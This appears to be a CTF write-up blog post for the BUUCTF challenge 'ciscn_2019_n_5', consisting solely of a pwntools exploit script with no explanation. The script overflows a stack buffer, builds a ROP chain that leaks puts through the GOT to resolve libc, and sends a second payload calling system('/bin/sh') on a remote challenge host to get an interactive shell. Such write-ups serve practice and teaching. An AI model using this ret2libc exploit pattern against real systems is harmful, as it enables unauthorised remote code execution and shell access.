+++
title = "ciscn_2019_n_5  wp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import *  
  
local_file = ('./ciscn_2019_n_5')  
  
select = 1  
if select == 0:  
    r = process(local_file)  
else:  
    r = remote('node5.buuoj.cn', 27578)  
elf = ELF(local_file)  
context.log_level = 'debug'  
  
offset1 = 64  
offset2 = 0x20+0x08  
  
puts_got = elf.got["puts"]  
puts_plt = elf.plt["puts"]  
main_addr = 0x00400636  
  
pop_rdi = 0x0000000000400713  
ret = 0x00000000004004c9  
  
r.sendlineafter("tell me your name\n",'1')  
  
payload = b'A'*offset2 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)  
r.sendlineafter("What do you want to say to me?\n",payload)  
  
puts_addr = u64(r.recvline().strip().ljust(8,b'\x00'))  
print(hex(puts_addr))  
libc = LibcSearcher("puts",puts_addr)  
libc_base = puts_addr - libc.dump('puts')  
system = libc_base + libc.dump('system')  
binsh = libc_base + libc.dump('str_bin_sh')  
  
  
r.sendlineafter("tell me your name\n",'1')  
payload1 = b'a' * offset2 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)  
r.sendline(payload1)  
  
r.interactive()
```
